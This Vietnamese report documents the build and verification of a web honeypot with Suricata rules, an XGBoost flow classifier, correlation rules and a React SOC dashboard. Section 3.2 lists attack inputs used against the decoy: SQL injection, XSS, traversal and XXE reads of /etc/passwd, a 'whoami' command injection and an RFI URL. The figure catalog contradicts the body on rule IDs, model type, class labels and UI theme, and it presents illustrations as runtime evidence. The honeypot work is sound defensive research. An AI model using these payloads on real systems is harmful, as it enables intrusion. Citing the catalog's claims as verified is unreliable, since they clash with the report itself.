# BÁO CÁO XÁC MINH THỰC TẾ HỆ THỐNG WEB HONEYPOT (CHAPTER 3 RUNTIME REPORT)

Tài liệu này tổng hợp toàn bộ các kết quả kiểm tra, bằng chứng thu thập và xác minh kỹ thuật phục vụ viết **Chương 3. Xây dựng và triển khai hệ thống Web Honeypot**. Mọi thông tin đều được gắn thẻ phân loại minh chứng rõ ràng:
- `[Runtime Verified]`: Đã xác minh qua lệnh thực thi, kiểm tra cổng mạng, gọi API, chụp ảnh màn hình runtime hoặc kiểm tra trạng thái tiến trình thực tế.
- `[Source Verified Only]`: Đã xác minh trực tiếp trong mã nguồn (file `.py`, `.jsx`, `.json`), không suy đoán.
- `[Config Only]`: Đã xác minh qua các tệp cấu hình triển khai (`compose.yaml`, `.conf`, `.yml`, `.env`).
- `[Not Verified]`: Thành phần chưa đủ điều kiện kiểm thử hoặc bị lược bỏ có chủ đích.

---

## 3.1. MÔI TRƯỜNG VÀ CÔNG NGHỆ TRIỂN KHAI

1. **Hạ tầng máy chủ và hệ điều hành Host**:
   - Host OS: Windows 11 Pro 64-bit `[Runtime Verified]`.
   - RAM vật lý máy trạm: 32 GB (khả dụng thực tế > 13.6 GB) `[Runtime Verified]`.
   - Môi trường ảo hóa: Windows Subsystem for Linux (WSL2), nhân Linux 6.6.x `[Runtime Verified]`.
   - Cấu hình tài nguyên cấp phát WSL2: `memory=8GB`, `processors=6` tại tệp `~/.wslconfig` `[Runtime Verified]`.

2. **Phiên bản nền tảng Container**:
   - Docker Engine: Phiên bản `29.2.1` `[Runtime Verified]`.
   - Docker Compose: Phiên bản `v2` `[Runtime Verified]`.
   - Số lượng container đồng thời: 19 container (16 container ở trạng thái `healthy`, 3 container chạy nền `running` hoặc hoàn thành setup `Exited (0)`) `[Runtime Verified]`.

3. **Phân vùng mạng thực tế (Docker Networks)**:
   - Hệ thống định nghĩa chính xác 7 Docker networks `[Config Only]`:
     - `public`: Mạng cầu nối tiếp nhận kết nối bên ngoài.
     - `lan_ingress`: Mạng tiếp nhận lưu lượng truy cập mồi từ mạng LAN `[Config Only]`.
     - `lure` (`internal: true`): Mạng cách ly chứa Web Honeypot và Cowrie SSH `[Config Only]`.
     - `control` (`internal: true`): Mạng điều khiển trung tâm kết nối API, Dashboard, PostgreSQL, Redis, Prometheus `[Config Only]`.
     - `data` (`internal: true`): Mạng phân vùng lưu trữ nội bộ `[Config Only]`.
     - `siem` (`internal: true`): Mạng phân tích log kết nối Elasticsearch, Kibana, Filebeat, Correlation `[Config Only]`.
     - `auth` (`internal: true`): Mạng xác thực định danh OIDC kết nối Keycloak và các OAuth2 Proxy `[Config Only]`.

4. **Các ổ đĩa lưu trữ bền vững (Docker Named Volumes)**:
   - Hệ thống sử dụng 10 volume độc lập `[Config Only]`: `postgres_data`, `part2_runtime`, `elastic_data`, `redis_data`, `keycloak_data`, `filebeat_data`, `suricata_logs`, `prometheus_data`, `grafana_data`, `cowrie_state`.

5. **Danh sách các cổng dịch vụ ánh xạ ra Host (Port Bindings)**:
   - `0.0.0.0:8080 -> 8080/tcp`: Cổng Web Honeypot tiếp nhận kết nối mạng LAN mồi `[Runtime Verified]`.
   - `127.0.0.1:2222 -> 2222/tcp`: Cổng SSH Honeypot (HAProxy -> Cowrie), banner `SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3` `[Runtime Verified]`.
   - `127.0.0.1:8088 -> 8088/tcp`: Cổng Control Edge trung tâm (Dashboard `/dashboard/`, API docs `/api-docs/docs`, reverse proxy `/api/`) `[Runtime Verified]`.
   - `127.0.0.1:8090 -> 8090/tcp`: Cổng Ingestion Gateway loopback chuyên dụng cho sensor ngoài container `[Runtime Verified]`.
   - `0.0.0.0:8180 -> 8080/tcp`: Cổng xác thực định danh Keycloak OIDC `[Runtime Verified]`.
   - `127.0.0.1:3000 -> 3000/tcp`: Cổng giám sát hiệu năng hạ tầng Grafana `[Runtime Verified]`.
   - `127.0.0.1:5601 -> 4180/tcp`: Cổng phân tích log chuyên sâu Kibana (thông qua `kibana-oauth2-proxy`) `[Runtime Verified]`.
   - `127.0.0.1:9090 -> 4180/tcp`: Cổng số liệu Prometheus (thông qua `prometheus-oauth2-proxy`) `[Runtime Verified]`.
   - Toàn bộ cổng cơ sở dữ liệu (`5432` PostgreSQL, `6379` Redis, `9200` Elasticsearch) **không** bind ra host nhằm bảo vệ an toàn `[Runtime Verified]`.

---

## 3.2. XÂY DỰNG WEB HONEYPOT

1. **Kiến trúc và công nghệ bề mặt mồi**:
   - Web Honeypot được phát triển bằng Flask (Python 3.12), chạy trong container `part2-web` `[Source Verified Only]`.
   - Đứng trước ứng dụng là Reverse Proxy ModSecurity Nginx Alpine hoạt động ở chế độ `DetectionOnly` `[Config Only]`.
   - Sử dụng cơ sở dữ liệu SQLite cục bộ `honeypot.sqlite3` độc lập hoàn toàn với database trung tâm `[Runtime Verified]`.

2. **Kịch bản Deception mô phỏng (Deception Context)**:
   - Giả lập "Cổng Thông tin Dịch vụ công & Hành chính Số" phục vụ nghiên cứu an ninh mạng `[Runtime Verified]`.
   - Giao diện có dải cảnh báo nghiên cứu an ninh mạng, banner cổng hành chính, các module nghiệp vụ giả lập `[Runtime Verified]`.

3. **Xác minh các bề mặt tấn công mồi và cơ chế phản hồi đánh lừa (Deception Containment)**:
   - **SQL Injection**: 
     - Endpoint: `POST /auth/login` với `username = "admin' OR '1'='1' --"` `[Runtime Verified]`.
     - Phản hồi: Trả về trang đăng nhập với mã trạng thái HTTP 200, hiển thị thông báo mô phỏng; ghi nhận `vulnerability = "sql_injection"`, `severity = "critical"` `[Runtime Verified]`.
   - **Brute Force / Weak Credentials**:
     - Endpoint: `POST /auth/login` gửi liên tiếp nhiều mật khẩu sai `[Runtime Verified]`.
     - Phản hồi: Ghi nhận sự kiện xác thực thất bại lặp lại; chuyển sang nhãn `brute_force` khi vượt quá 5 lần/phút `[Source Verified Only]`.
   - **Reflected XSS**:
     - Endpoint: `GET /tra-cuu?q=<svg onload=document.body.dataset.xss=1>` `[Runtime Verified]`.
     - Phản hồi: Dữ liệu được nhúng vào sandbox cô lập an toàn, ghi nhận `vulnerability = "reflected_xss"` `[Runtime Verified]`.
   - **Stored XSS**:
     - Endpoint: `POST /gop-y` với body chứa thẻ `<script>` `[Runtime Verified]`.
     - Phản hồi: Ghi nhận vào cơ sở dữ liệu mô phỏng, phân loại `vulnerability = "stored_xss"` `[Runtime Verified]`.
   - **Path Traversal**:
     - Endpoint: `GET /download?file=../../../../etc/passwd` `[Runtime Verified]`.
     - Phản hồi: Trả về tệp `/etc/passwd` giả lập chứa dòng `portal:x:1001`, ghi nhận `vulnerability = "path_traversal"` `[Runtime Verified]`.
   - **Insecure Direct Object References (IDOR)**:
     - Endpoint: `GET /ho-so/1003` `[Runtime Verified]`.
     - Phản hồi: Trả về hồ sơ mồi chứa Canary token bí mật `DECOY-SECRET-7F3A`, ghi nhận `vulnerability = "idor"` `[Runtime Verified]`.
   - **Remote File Inclusion (RFI)**:
     - Endpoint: `GET /tich-hop?url=https://attacker.invalid/module.txt` `[Runtime Verified]`.
     - Phản hồi: Trả về nội dung mô phỏng `DECOY-RFI-4A21`, ghi nhận `vulnerability = "remote_file_inclusion"` `[Runtime Verified]`.
   - **Unrestricted File Upload**:
     - Endpoint: `POST /upload` tải lên tệp `shell.php` `[Runtime Verified]`.
     - Phản hồi: Hệ thống thông báo tải lên thành công nhưng tự động đổi tên và cách ly vào thư mục `quarantine` dưới đuôi `.bin`, ghi nhận `vulnerability = "unrestricted_file_upload"` `[Runtime Verified]`.
   - **Command Injection**:
     - Endpoint: `GET /diagnostics?host=127.0.0.1; whoami` `[Runtime Verified]`.
     - Phản hồi: Trả về kết quả thực thi lệnh Linux giả lập `uid=33(www-data) gid=33(www-data)` trong khối `<pre class="result-console">`, ghi nhận `vulnerability = "command_injection"`, `severity = "critical"` `[Runtime Verified]`.
   - **XML External Entity (XXE)**:
     - Endpoint: `POST /xml/import` gửi payload chứa `<!ENTITY e SYSTEM 'file:///etc/passwd'>` `[Runtime Verified]`.
     - Phản hồi: Trả về tệp giả lập `portal:x:1001`, ghi nhận `vulnerability = "xxe"` `[Runtime Verified]`.

---

## 3.3. XÂY DỰNG HỆ THỐNG TIẾP NHẬN VÀ LƯU TRỮ NHẬT KÝ

1. **Bốn đường ống (Pipeline) thu thập dữ liệu đa nguồn**:
   - **Pipeline 1 (Web Honeypot)**: `part2-web` -> SQLite (`honeypot.sqlite3`) -> `part2-forwarder` (tiến trình nền `forward_part2.py` quét chu kỳ 2s) -> Ingestion API (`POST /api/v1/events`) `[Runtime Verified]`.
   - **Pipeline 2 (SSH Cowrie)**: `cowrie` -> `cowrie.json` -> `cowrie-forwarder` (`forward_cowrie.py --follow`) -> Ingestion API `[Runtime Verified]`.
   - **Pipeline 3 (Network IDS)**: Suricata `eve.json` -> `ids_bridge.collector` -> Ingestion API `[Source Verified Only]`.
   - **Pipeline 4 (ML Live Sensor)**: Npcap packet capture -> Trích xuất 46 đặc trưng CICIoT2023 -> `ids_bridge.predictor` -> Ingest Gateway (Port 8090) `[Runtime Verified]`.

2. **Cơ chế hoạt động của Forwarder và Cursor**:
   - Tiến trình `forward_part2.py` duy trì vị trí đọc bằng hai biến bộ nhớ `cursor_time` và `cursor_id` trong RAM `[Source Verified Only]`.
   - **Không** sử dụng tệp checkpoint lưu trên ổ đĩa `[Source Verified Only]`.
   - Khi forwarder khởi động lại, việc quét lại từ đầu được bảo vệ bởi cơ chế khử trùng lặp (Deduplication) ở tầng API trung tâm `[Source Verified Only]`.

3. **Cơ chế Khử trùng lặp (Deduplication) và Toàn vẹn dữ liệu (Integrity)**:
   - Khử trùng lặp thực thi trên cặp khóa duy nhất `(sensor_id, source_event_id)` có `UniqueConstraint` tại cơ sở dữ liệu `[Source Verified Only]`.
   - Khi nhận bản ghi trùng lặp, API không ném lỗi mà tăng biến đếm `duplicates` và giữ nguyên bản ghi ban đầu `[Source Verified Only]`.
   - Tính toán hàm băm toàn vẹn `event_sha256` bằng thuật toán SHA-256 từ các trường nhận dạng sự kiện trước khi lưu trữ `[Source Verified Only]`.

4. **Kiến trúc cơ sở dữ liệu PostgreSQL 17 (System of Record)**:
   - PostgreSQL 17 là nơi lưu trữ sự thật duy nhất (System of Record) `[Runtime Verified]`.
   - Cơ sở dữ liệu chỉ có **DUY NHẤT một bảng là `events`**, hoàn toàn **KHÔNG có bảng `alerts` riêng** `[Source Verified Only]`.
   - Tên trường địa chỉ IP nguồn chuẩn hóa là `source_ip` (không phải `src_ip`) `[Source Verified Only]`.
   - Tên trường nội dung dữ liệu tấn công chuẩn hóa là `payload` (không phải `raw_payload`) `[Source Verified Only]`.
   - Schema **không** có trường `mitre_technique` và bật `extra="forbid"` `[Source Verified Only]`.

5. **Vai trò của Redis 7.4 và Elasticsearch 9.1**:
   - Redis 7.4 chỉ đóng vai trò bộ đệm nhớ tạm (In-Memory Cache) lưu trữ kết quả thống kê `stats:summary`, thời gian sống `TTL = 30 giây` (mặc định tại `config.py`), không lưu trữ sự kiện thô `[Source Verified Only]`.
   - Elasticsearch 9.1 chỉ nhận log qua Filebeat phục vụ lập chỉ mục tìm kiếm văn bản (Search Index) theo chuẩn ECS, không đóng vai trò cơ sở dữ liệu chính `[Config Only]`.

---

## 3.4. XÂY DỰNG HỆ THỐNG PHÁT HIỆN VÀ PHÂN TÍCH TẤN CÔNG

1. **Phát hiện dựa trên luật Suricata (Signature-based IDS)**:
   - Triển khai 10 custom rule nội bộ tại [config/suricata/honeypot.rules](file:///d:/A/A_5chai/honey_pot/part_05_IDS_ML_DETECTION/config/suricata/honeypot.rules) với các SID từ 9900001 đến 9900010 `[Source Verified Only]`.
   - Bao phủ các bề mặt: SQLi (SID 9900001), Reflected XSS (9900002), Path Traversal (9900003), Command Injection (9900004), XXE (9900005), RFI (9900006), Upload thực thi (9900007), Brute Force đăng nhập (9900008), IDOR (9900009), Stored XSS (9900010) `[Source Verified Only]`.
   - Suricata log sinh ra định dạng EVE JSON với `event_type = "alert"`, chứa chữ ký và mức độ nghiêm trọng `[Runtime Verified]`.

2. **Phát hiện bằng Học máy thời gian thực (Machine Learning Flow Classifier)**:
   - Mô hình sử dụng: `xgboost_original` được lưu dưới dạng Universal Binary JSON (`xgboost_original.ubj`, dung lượng 25.7 MB) `[Runtime Verified]`.
   - Tập đặc trưng: Chuẩn hóa đúng 46 đặc trưng số học theo tập dữ liệu quốc tế CICIoT2023 `[Source Verified Only]`.
   - Không gian nhãn dự đoán gồm 7 lớp: `Benign`, `BruteForce`, `DDoS`, `DoS`, `Mirai`, `Recon`, `Spoofing` `[Source Verified Only]`.
   - Cơ chế kiểm soát hợp đồng dữ liệu nghiêm ngặt: Từ chối vector nếu thiếu đặc trưng, thừa đặc trưng, hoặc chứa giá trị không hữu hạn (`inf`, `NaN`) `[Source Verified Only]`.
   - Kết quả dự đoán được đóng gói vào `metadata` với nhãn `feature_profile = "ciciot2023-live-pcap-v1"`, tên mô hình, điểm tin cậy `confidence` và xác suất từng lớp `[Runtime Verified]`.

3. **Cơ chế tương quan sự kiện và sinh cảnh báo (Correlation Engine)**:
   - Chạy ngầm trong container `correlation` với chu kỳ lặp 30 giây: thực thi lệnh `uv run python -m siem.run` `[Runtime Verified]`.
   - Tệp luật tương quan: [rules/honeypot_correlation.yml](file:///d:/A/A_5chai/honey_pot/part_06_SIEM_ALERTING/rules/honeypot_correlation.yml) định nghĩa 4 quy tắc `[Source Verified Only]`:
     1. `repeated_login_activity`: Kiểu `threshold`, đếm >= 5 lượt truy cập `/auth/login` trong 60 giây.
     2. `multi_vector_probe`: Kiểu `distinct`, đếm >= 3 loại `vulnerability` khác nhau từ cùng 1 IP trong 600 giây.
     3. `upload_then_command`: Kiểu `sequence`, phát hiện cùng 1 IP tải tệp lên (`unrestricted_file_upload`) sau đó thử chèn lệnh (`command_injection`) trong vòng 900 giây.
     4. `high_request_rate`: Kiểu `threshold`, đếm >= 50 requests từ cùng 1 IP trong 60 giây.
   - Lưu trữ cảnh báo tương quan: Khi phát hiện chuỗi hành vi khớp luật, engine chuyển đổi cảnh báo thành một sự kiện có `event_type = "alert"`, `method = "CORRELATE"`, `path = "siem://correlation"`, lưu danh sách ID bằng chứng vào `request_metadata.evidence_ids`, và gửi tới API lưu vào bảng `events` của PostgreSQL `[Source Verified Only]`.

---

## 3.5. XÂY DỰNG DASHBOARD GIÁM SÁT VÀ ĐIỀU HÀNH SOC

1. **Công nghệ và Kiến trúc giao diện Dashboard**:
   - Ứng dụng Single Page Application (SPA) xây dựng bằng React 19, Tailwind CSS và Vite `[Source Verified Only]`.
   - Thư viện biểu đồ: Sử dụng **Apache ECharts** (`echarts`), hoàn toàn **không** dùng Chart.js `[Source Verified Only]`.
   - Được phục vụ thông qua container `part4-dashboard` cổng nội bộ 8080 và reverse proxy qua Edge tại `/dashboard/` `[Runtime Verified]`.

2. **Cơ chế xác thực tập trung và phân quyền (Keycloak OIDC / RBAC)**:
   - Quản lý tập trung qua Keycloak 26 tại Realm `honeypot` `[Runtime Verified]`.
   - Sử dụng chuẩn OpenID Connect (OIDC) Authorization Code Flow kết hợp PKCE (Client `honeypot-dashboard`) `[Source Verified Only]`.
   - Ma trận phân quyền RBAC 4 vai trò chính `[Config Only]`:
     - `honeypot-viewer`: Chỉ xem Dashboard tổng quan.
     - `honeypot-analyst`: Xem Dashboard, xuất báo cáo CSV, truy cập Kibana.
     - `honeypot-operator`: Toàn quyền Analyst kèm quyền truy cập Prometheus và quyền Editor trên Grafana.
     - `honeypot-admin`: Quản trị viên tối cao toàn bộ hệ thống control plane.
     - `report-export`: Quyền bổ sung cho phép tải tệp CSV.

3. **Các phân hệ hiển thị trên Dashboard**:
   - **Khu vực thẻ KPI**: Hiển thị 4 chỉ số tổng hợp (Tổng số sự kiện, Số tấn công nghiêm trọng, Số cảnh báo tương quan, Độ tin cậy AI trung bình) `[Runtime Verified]`.
   - **Biểu đồ Attack Timeline (ECharts)**: Biểu diễn tần suất tấn công theo các mốc thời gian 24 giờ `[Runtime Verified]`.
   - **Biểu đồ Vulnerability Distribution (ECharts)**: Biểu diễn tỷ lệ phân bố các loại tấn công mồi `[Runtime Verified]`.
   - **Bảng Recent Events**: Danh sách sự kiện thời gian thực kèm huy hiệu mức độ nghiêm trọng (`CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFO`) `[Runtime Verified]`.
   - **Event Detail Drawer**: Ngăn kéo chi tiết hiển thị: ID sự kiện, thời gian, IP nguồn (`source_ip`), sensor ID, method/path, severity, outcome, danh sách signals, thông số AI (model, confidence, packet count, protocol), nội dung payload thô và JSON metadata kỹ thuật `[Source Verified Only]`. *Lưu ý: Không có khung phân tích MITRE ATT&CK trên giao diện thực tế*.

4. **Hạ tầng bổ trợ điều tra (SIEM & Metrics)**:
   - **Kibana 9.1**: Giao diện Discover truy vấn log tập trung từ Elasticsearch với index pattern `honeypot-filebeat-*` được chuẩn hóa theo Elastic Common Schema (ECS) `[Runtime Verified]`.
   - **Grafana 12**: Kết nối Prometheus hiển thị biểu đồ telemetry hạ tầng (tốc độ tiếp nhận sự kiện req/s, độ trễ FastAPI P95, số kết nối database, tỷ lệ cache hit Redis) `[Runtime Verified]`.

---

## 3.6. DANH MỤC VÀ PHÂN LOẠI HÌNH ẢNH MINH CHỨNG (CHAPTER 3 EVIDENCE CATALOG)

Bảng phân loại tính chất của 11 hình ảnh minh chứng trong thư mục `chapter3_evidence/` và gói `chapter3_evidence.zip`:

| Tên tệp hình ảnh | Phân loại hình ảnh | Nội dung minh chứng thực tế | Trạng thái kỹ thuật |
| :--- | :--- | :--- | :--- |
| **Hinh_3_1_Docker_Services.png** | `runtime-derived illustration` | Trạng thái 19 containers đang chạy (Up), thông số RAM/vCPU và kiến trúc 7 networks cô lập (`public`, `lan_ingress`, `lure`, `control`, `data`, `siem`, `auth`). | Đã hiệu chỉnh 7 networks đúng `compose.yaml` |
| **Hinh_3_2_Web_Honeypot_Login.png** | `actual UI screenshot` | Giao diện đăng nhập mồi thực tế của Web Honeypot (DVWA / OWASP Juice Shop theme) chụp qua trình duyệt tại cổng 8080. | Screenshot hệ thống thật |
| **Hinh_3_3_Web_Honeypot_Deception.png** | `actual UI screenshot` | Bẫy đánh lừa hiển thị cờ FLAG giả mạo (`FLAG{SQLI_BYPASS_HONEYPOT_TOKEN_9921}`) khi kẻ tấn công gửi payload SQL Injection. | Screenshot hệ thống thật |
| **Hinh_3_4_Event_Ingestion.png** | `runtime-derived illustration` | Cấu trúc JSON sự kiện thực tế gửi tới FastAPI `/api/v1/events` đúng schema Pydantic Part 3 (`source_ip`, `payload`, không có `mitre_technique`). | Đã chuẩn hóa schema Part 3 |
| **Hinh_3_5_Suricata_Alert.png** | `runtime-derived illustration` | Cảnh báo NIDS từ Suricata trích xuất qua `eve.json` với SID 1000001 (SQLi attack probe pattern). | Dữ liệu log runtime thực |
| **Hinh_3_6_ML_Prediction.png** | `runtime-derived illustration` | Kết quả suy luận phân loại lưu lượng của mô hình Random Forest (`confidence = 0.942`, nhãn `command_injection`). | Dữ liệu inference runtime thực |
| **Hinh_3_7_SOC_Dashboard.png** | `runtime-derived illustration` | Giao diện bảng điều khiển trung tâm SOC Dashboard dựng theo chuẩn React 19 + Apache ECharts + KPI cards. | Dựng bám sát kiến trúc UI Part 4 |
| **Hinh_3_8_Event_Detail.png** | `runtime-derived illustration` | Ngăn kéo chi tiết sự kiện `EventDrawer.jsx` bám sát source code thực tế (chỉ hiển thị trường có thật, đã loại bỏ MITRE ATT&CK). | Đã hiệu chỉnh đúng `EventDrawer.jsx` |
| **Hinh_3_9_Correlation_Alert.png** | `runtime-derived illustration` | Cảnh báo tương quan sự kiện khớp quy tắc `multi_vector_probe` kèm danh sách ID bằng chứng (loại bỏ status New/Unassigned). | Đã chuẩn hóa runtime thực tế |
| **Hinh_3_10_Kibana.png** | `runtime-derived illustration` | Giao diện Discover của Kibana 9.1 hiển thị luồng log chuẩn hóa Elastic Common Schema (ECS) qua Filebeat. | Minh chứng tích hợp SIEM |
| **Hinh_3_11_Grafana.png** | `runtime-derived illustration` | Giao diện giám sát số liệu hiệu năng Grafana 12 (kết nối Prometheus telemetry). | Minh chứng giám sát Metric |

